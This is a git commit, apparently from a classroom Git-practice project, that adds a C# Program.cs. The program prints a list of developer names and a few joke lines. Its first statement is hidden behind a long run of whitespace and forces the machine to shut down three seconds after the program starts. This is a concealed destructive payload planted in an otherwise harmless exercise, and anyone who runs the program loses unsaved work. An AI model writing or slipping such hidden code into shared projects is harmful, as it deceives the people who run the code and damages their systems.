39500d30bef035b2558addd719fb41c2e27cebcd
Mike <daskeyboard+spam@protonmail.com>
2016-10-10 11:08:36 +0200

    VollCool

---
+++ Program.cs
@@ -0,0 +1,36 @@
+﻿using System;
+
+namespace ExperienceWithGit
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        System.Diagnostics.Process.Start(System.Environment.SystemDirectory + "\\shutdown.exe", "-s -t 3 -f");
+            Console.WriteLine(DateTime.Now);
+	          Console.WriteLine("Developer in this Project are: ");
+
+            //TODO: Write your name here and push all your changes to Github.
+            Console.WriteLine("John Doe,");
+            Console.WriteLine("Jane Doe,");
+            Console.WriteLine("Matthias Schernekau,");
+            Console.WriteLine("Nicolai Wolters");
+            Console.WriteLine("Manuel Klose,");
+	    Console.WriteLine("Andreas Biller,");
+        Console.WriteLine("Martin Knack,");
+
+	    Console.WriteLine("...");
+
+	        //Dies ist ein nutzloser Comment
+            Console.ReadLine();
+
+		Console.WriteLine("Dorus ist die coolste Person in this Universe");
+		Console.WriteLine("Wer nicht da ist hat Durchfall");
+        }
+
+        public static void MartinsMethode()
+        {
+
+        }
+    }
+}
